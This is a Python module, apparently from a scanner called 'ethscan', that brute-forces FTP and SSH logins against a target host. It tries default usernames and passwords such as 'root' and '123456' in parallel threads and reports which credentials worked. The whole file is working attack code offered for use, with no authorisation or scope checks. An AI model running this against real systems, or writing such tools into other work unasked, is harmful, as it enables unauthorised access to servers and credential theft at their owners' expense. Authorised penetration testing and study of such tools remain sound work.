"""Brute-force login module for ethscan (FTP/SSH)."""

import json
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from ftplib import FTP
from typing import Dict, List, Optional

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False


DEFAULT_PROTOCOL = "ftp"
DEFAULT_FTP_PORT = 21
DEFAULT_SSH_PORT = 22
DEFAULT_TIMEOUT = 5.0
DEFAULT_WORKERS = 10

DEFAULT_USERNAMES = [
    "admin",
    "root",
    "user",
    "test",
    "ftp",
    "anonymous",
]

DEFAULT_PASSWORDS = [
    "admin",
    "password",
    "123456",
    "root",
    "letmein",
    "test",
    "guest",
    "",
]

SUPPORTED_PROTOCOLS = {"ftp", "ssh"}


def load_wordlist(path: str) -> List[str]:
    """Load a wordlist from file, one entry per line.

    Args:
        path: Path to wordlist file.

    Returns:
        List of entries (lines stripped, empty lines and comments skipped).
    """
    with open(path, "r", encoding="utf-8") as handle:
        return [
            line.strip()
            for line in handle
            if line.strip() and not line.startswith("#")
        ]


def _normalize_host(target: str) -> str:
    """Extract a bare hostname from a target that may be a URL or host.

    Args:
        target: Bare host (e.g. ftp.example.com) or URL (e.g. ftp://user@host/).

    Returns:
        Lowercased hostname without scheme, path, or credentials.
    """
    normalized = target.strip()
    if "://" not in normalized:
        normalized = "https://" + normalized
    from urllib.parse import urlparse

    parsed = urlparse(normalized)
    return (parsed.hostname or parsed.netloc or "").lower()


def _default_port(protocol: str) -> int:
    """Return the conventional port for a protocol."""
    if protocol == "ssh":
        return DEFAULT_SSH_PORT
    return DEFAULT_FTP_PORT


def _attempt_ftp(
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: float,
) -> Dict[str, object]:
    """Attempt a single FTP login.

    Args:
        host: Target hostname or IP address.
        port: FTP port.
        username: Username to try.
        password: Password to try.
        timeout: Connection timeout in seconds.

    Returns:
        Dict with username, password, success flag, and error (if any).
    """
    result: Dict[str, object] = {
        "username": username,
        "password": password,
        "success": False,
        "error": None,
    }
    ftp = FTP()
    try:
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)
        result["success"] = True
    except Exception as exc:
        result["error"] = str(exc)
    finally:
        try:
            ftp.close()
        except Exception:  # pragma: no cover - defensive
            pass
    return result


def _attempt_ssh(
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: float,
) -> Dict[str, object]:
    """Attempt a single SSH login (requires paramiko).

    Args:
        host: Target hostname or IP address.
        port: SSH port.
        username: Username to try.
        password: Password to try.
        timeout: Connection timeout in seconds.

    Returns:
        Dict with username, password, success flag, and error (if any).
    """
    result: Dict[str, object] = {
        "username": username,
        "password": password,
        "success": False,
        "error": None,
    }
    if not PARAMIKO_AVAILABLE:
        result["error"] = (
            "paramiko is required for SSH brute force; "
            "install it with 'pip install paramiko'"
        )
        return result

    client = paramiko.SSHClient()
    try:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
        )
        result["success"] = True
    except Exception as exc:
        result["error"] = str(exc)
    finally:
        try:
            client.close()
        except Exception:  # pragma: no cover - defensive
            pass
    return result


def run_brute(
    target: str,
    protocol: str = DEFAULT_PROTOCOL,
    usernames: Optional[List[str]] = None,
    passwords: Optional[List[str]] = None,
    port: Optional[int] = None,
    timeout: float = DEFAULT_TIMEOUT,
    max_workers: int = DEFAULT_WORKERS,
) -> Dict[str, object]:
    """Run a brute-force login attack against a target.

    Args:
        target: Target host or URL (e.g. ftp.example.com).
        protocol: Protocol to attack ('ftp' or 'ssh').
        usernames: List of usernames to try. If None, uses DEFAULT_USERNAMES.
        passwords: List of passwords to try. If None, uses DEFAULT_PASSWORDS.
        port: Target port. If None, uses the protocol default (21/22).
        timeout: Per-attempt connection timeout in seconds.
        max_workers: Maximum number of concurrent attempts.

    Returns:
        Structured results with target, host, protocol, port, attempt
        counts, successful logins, and all attempt results.

    Raises:
        ValueError: If the protocol is not supported.
    """
    if protocol not in SUPPORTED_PROTOCOLS:
        raise ValueError(
            "Unsupported protocol: {} (valid: {})".format(
                protocol, ", ".join(sorted(SUPPORTED_PROTOCOLS))
            )
        )

    host = _normalize_host(target)
    resolved_port = port if port else _default_port(protocol)
    users = list(usernames) if usernames is not None else DEFAULT_USERNAMES
    passwds = list(passwords) if passwords is not None else DEFAULT_PASSWORDS

    attempt = _attempt_ftp if protocol == "ftp" else _attempt_ssh

    results: List[Dict[str, object]] = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [
            executor.submit(attempt, host, resolved_port, user, pwd, timeout)
            for user in users
            for pwd in passwds
        ]
        for future in as_completed(futures):
            results.append(future.result())

    results.sort(key=lambda r: (str(r["username"]), str(r["password"] or "")))

    successful = [r for r in results if r["success"]]

    return {
        "target": target,
        "host": host,
        "protocol": protocol,
        "port": resolved_port,
        "timeout": timeout,
        "usernames_tested": len(users),
        "passwords_tested": len(passwds),
        "attempts": len(results),
        "successful_count": len(successful),
        "successful": successful,
        "results": results,
    }


def format_brute_report_json(data: Dict[str, object]) -> str:
    """Format brute-force results as JSON."""
    return json.dumps(data, indent=2, default=str)


def format_brute_report_markdown(data: Dict[str, object]) -> str:
    """Format brute-force results as Markdown."""
    lines = ["# ethscan Brute Force Report", ""]
    lines.append(f"- **Target:** {data['target']}")
    lines.append(f"- **Host:** {data['host']}")
    lines.append(f"- **Protocol:** {data['protocol']}")
    lines.append(f"- **Port:** {data['port']}")
    lines.append(f"- **Attempts:** {data['attempts']}")
    lines.append(f"- **Successful Logins:** {data['successful_count']}")
    lines.append("")

    lines.append("## Successful Logins")
    if data["successful"]:
        lines.append("| Username | Password |")
        lines.append("|----------|----------|")
        for entry in data["successful"]:
            lines.append(f"| {entry['username']} | {entry['password']} |")
    else:
        lines.append("*No successful logins.*")
    lines.append("")

    lines.append("## All Attempts")
    lines.append("| Username | Password | Success | Error |")
    lines.append("|----------|----------|---------|-------|")
    for result in data["results"]:
        password = result["password"] or ""
        success = "Yes" if result["success"] else "No"
        error = result["error"] or ""
        lines.append(f"| {result['username']} | {password} | {success} | {error} |")

    return "\n".join(lines)
